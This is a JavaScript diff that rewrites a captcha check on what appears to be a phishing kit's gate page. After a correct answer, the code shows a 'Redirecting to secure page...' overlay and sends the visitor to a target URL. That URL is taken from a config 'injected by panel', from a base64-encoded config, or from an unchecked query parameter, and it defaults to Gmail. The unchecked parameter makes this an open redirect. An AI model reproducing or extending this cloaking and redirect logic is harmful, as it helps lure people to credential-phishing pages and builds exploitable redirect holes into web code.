@@ -832,50 +832,90 @@
     }
     
     function checkCaptcha() {
-        const input = document.getElementById('captcha-input');
-        const status = document.getElementById('captcha-status');
+    const input = document.getElementById('captcha-input');
+    const status = document.getElementById('captcha-status');
+    
+    if (!input || !status) return;
+    
+    const userAnswer = parseInt(input.value);
+    const correctAnswer = window._captchaAnswer;
+    
+    if (userAnswer === correctAnswer) {
+        status.className = 'success';
+        status.style.background = '#d4edda';
+        status.style.color = '#155724';
+        status.textContent = '✅ Verification successful! Redirecting...';
         
-        if (!input || !status) return;
+        // ============================================================
+        // CRITICAL FIX: Get target URL from multiple sources
+        // ============================================================
         
-        const userAnswer = parseInt(input.value);
-        const correctAnswer = window._captchaAnswer;
+        // Try multiple sources for target URL
+        let targetUrl = null;
         
-        if (userAnswer === correctAnswer) {
-            status.className = 'success';
-            status.style.background = '#d4edda';
-            status.style.color = '#155724';
-            status.textContent = '✅ ' + (window.__config?.captchaSuccessText || 'Verification successful! Redirecting...');
-            
-            // ============================================================
-            // CRITICAL: Direct redirect to target URL
-            // ============================================================
-            const targetUrl = window.__config?.targetUrl || 'https://mail.google.com';
-            
-            // Show loading overlay while redirecting
-            const overlay = document.createElement('div');
-            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:99999;display:flex;justify-content:center;align-items:center;color:white;font-family:Arial,sans-serif;font-size:18px;';
-            overlay.innerHTML = '<div style="text-align:center;"><div style="width:40px;height:40px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #fff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px;"></div><p>Redirecting to secure page...</p><style>@keyframes spin{to{transform:rotate(360deg)}}</style></div>';
-            document.body.appendChild(overlay);
-            
-            // Redirect after delay
-            setTimeout(function() {
-                window.location.href = targetUrl;
-            }, 1500);
-            
-        } else {
-            status.className = 'error';
-            status.style.background = '#f8d7da';
-            status.style.color = '#721c24';
-            status.textContent = '❌ ' + (window.__config?.captchaErrorText || 'Incorrect. Please try again.');
-            setTimeout(function() {
-                renderCaptcha();
-                status.className = '';
-                status.style.background = '';
-                status.style.color = '';
-                status.textContent = '';
-            }, 1500);
+        // 1. From window.__config (injected by panel)
+        if (window.__config && window.__config.targetUrl) {
+            targetUrl = window.__config.targetUrl;
+            console.log('🎯 Target URL from config:', targetUrl);
         }
+        
+        // 2. From window.__cfg (base64 encoded config)
+        if (!targetUrl && window.__cfg) {
+            try {
+                const decoded = atob(window.__cfg);
+                const cfg = JSON.parse(decoded);
+                if (cfg && cfg.targetUrl) {
+                    targetUrl = cfg.targetUrl;
+                    console.log('🎯 Target URL from __cfg:', targetUrl);
+                }
+            } catch(e) {
+                console.warn('Could not parse __cfg:', e);
+            }
+        }
+        
+        // 3. From URL parameters (fallback)
+        if (!targetUrl) {
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlParam = urlParams.get('target');
+            if (urlParam) {
+                targetUrl = decodeURIComponent(urlParam);
+                console.log('🎯 Target URL from query param:', targetUrl);
+            }
+        }
+        
+        // 4. Hardcoded fallback
+        if (!targetUrl) {
+            targetUrl = 'https://mail.google.com';
+            console.warn('⚠️ Using fallback target URL:', targetUrl);
+        }
+        
+        console.log('🚀 Redirecting to:', targetUrl);
+        
+        // Show loading overlay while redirecting
+        const overlay = document.createElement('div');
+        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:99999;display:flex;justify-content:center;align-items:center;color:white;font-family:Arial,sans-serif;font-size:18px;';
+        overlay.innerHTML = '<div style="text-align:center;"><div style="width:40px;height:40px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #fff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px;"></div><p>Redirecting to secure page...</p><style>@keyframes spin{to{transform:rotate(360deg)}}</style></div>';
+        document.body.appendChild(overlay);
+        
+        // Redirect after delay
+        setTimeout(function() {
+            window.location.href = targetUrl;
+        }, 1500);
+        
+    } else {
+        status.className = 'error';
+        status.style.background = '#f8d7da';
+        status.style.color = '#721c24';
+        status.textContent = '❌ ' + (window.__config?.captchaErrorText || 'Incorrect. Please try again.');
+        setTimeout(function() {
+            renderCaptcha();
+            status.className = '';
+            status.style.background = '';
+            status.style.color = '';
+            status.textContent = '';
+        }, 1500);
     }
+}
     
     // ================================================================
     // INITIALIZATION
